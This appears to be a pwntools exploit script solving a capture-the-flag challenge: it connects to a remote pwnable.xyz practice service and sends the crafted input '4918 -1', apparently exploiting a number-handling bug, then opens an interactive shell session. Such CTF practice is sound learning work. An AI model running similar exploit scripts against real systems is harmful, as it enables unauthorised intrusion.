from pwn import *

elf = context.binary = ELF("challenge/challenge")
# p = process()
p = remote("svc.pwnable.xyz",30001)

p.sendline(b'4918 -1')
p.interactive()